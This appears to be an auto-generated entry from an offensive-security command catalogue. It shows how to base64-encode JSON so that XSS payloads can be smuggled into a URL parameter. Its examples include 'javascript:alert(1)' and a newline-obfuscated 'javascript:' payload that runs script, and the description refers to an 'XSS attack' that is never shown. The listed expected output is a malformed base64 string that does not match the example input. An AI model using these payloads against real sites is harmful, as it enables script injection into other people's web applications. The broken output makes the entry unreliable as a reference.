---
data: echo -n 'JSON_STRING' | base64
tags:
  - encoding
  - json
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-13T23:52:25.398Z'
id: d3294f42-1f9c-4f4d-8cb5-ab09baa5f889
verified: false
validated: true
submitted: true
---
# base64-encode-json

## Command

```bash
echo -n '{"name": "Test", "promo_code": "javascript:alert(1)"}' | base64
```

## Description

This command encodes a JSON string to Base64, useful for crafting payloads in URL parameters like the 'q' in this XSS attack. The -n flag prevents adding a newline.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `echo -n` | Outputs string without trailing newline | Yes |
| `'JSON_STRING'` | The JSON to encode | Yes |
| `| base64` | Pipes to base64 encoder | Yes |

## Examples

### Basic Usage

```bash
echo -n '{"key":"value"}' | base64
```

### Advanced Usage

```bash
echo -n '{"promo_code": "javascript://test%0aalert(document.domain)"}' | base64 -w 0
```

## Expected Output

Base64-encoded string, e.g., eyJuYW1lIjogIlRlc3QiLCAicHJvbW9fY29kZSI6ICJqYXZhc2NyaXB0OmFscnQoMSki}

## Related

- [[Related Procedure]]
